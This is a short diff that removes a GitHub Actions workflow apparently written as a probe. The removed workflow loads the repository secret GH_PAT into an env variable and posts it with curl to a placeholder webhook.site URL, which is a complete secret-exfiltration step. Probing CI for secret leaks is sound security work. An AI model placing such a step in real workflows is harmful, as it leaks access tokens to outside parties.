@@ -1,9 +1,0 @@
-name: Probe - secret read through the env context
-on: workflow_dispatch
-env:
-  EXFIL: ${{ secrets.GH_PAT }}
-jobs:
-  send:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl -d "${{ env.EXFIL }}" https://webhook.site/00000000-0000-0000-0000-000000000000
